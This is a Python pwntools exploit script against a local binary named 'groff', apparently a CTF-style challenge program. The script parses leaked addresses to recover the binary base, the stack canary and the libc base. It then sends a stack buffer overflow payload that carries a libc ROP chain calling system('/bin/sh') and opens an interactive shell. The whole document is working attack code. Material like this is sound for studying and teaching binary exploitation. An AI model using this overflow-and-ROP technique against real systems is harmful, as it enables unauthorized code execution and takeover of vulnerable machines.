from pwn import *

context.clear(arch="amd64")
LOCATION = "./groff"                         # position of the binary 
LIBC_LOC = "/lib/x86_64-linux-gnu/libc.so.6" # position of libc, make sure it matches yours by running ldd ./groff
binary   = ELF(LOCATION)                     # create ELF object from binary
libc     = ELF(LIBC_LOC)                     # create ELF object from libc

def ROP2Hack():
    rop = ROP(libc)                               # initialize ROP object from libc
    rop.system(libc.search("/bin/sh\x00").next()) # generate ROP chain to spawn system("/bin/sh")
    rop.exit()                                    # append exit() to quit gracefully
    return str(rop)                               # return ropchain

def exploit():
    
    proc = process(LOCATION, timeout=2)                                   # spawn process
    proc.recvline()                                                       # receive lines and process leaked addresses
    proc.recvuntil(" ")                                                   #                                             
    target = int(proc.recv(18), base=16)                                  # process "target" function address
    binary.address = target - binary.symbols["groff"]                     # subtract "target" offset from "target" address to find binary base address
    log.success("Binary base address @ {0}".format(hex(binary.address)))  # 
    
    for i in range(4):                                                    # skip through useless addresses
        proc.recvline()                                                   # as above
    proc.recvuntil(" ")                                                   # as above
    canary = int(proc.recv(18), base=16)                                  # process canary value
    proc.recvuntil(" ")                                                   # skip through useless addresses
    proc.recvuntil(" ")                                                   # as above
    libc.address = int(proc.recv(18), base=16) - libc.symbols["__libc_start_main"] - 234 # update libc base address using leaked data
    log.success("Canary value is {0}".format(hex(canary)))
    log.success("Libc base address @ {0}".format(hex(libc.address)))
    
    exp  = ""                                                            # build exploit-----------------
    exp += 'A' * 40                                                      #                              |
    exp += p64(canary)                                                   # append canary to exploit     |
    exp += "A" * 8                                                       #                              |
    exp += ROP2Hack()                                                    # append ropchain to exploit ---
     
    proc.recv()
    proc.sendline(exp)                                                   # send exploit
    proc.recv()
    proc.interactive()                                                   # profit
    
exploit()
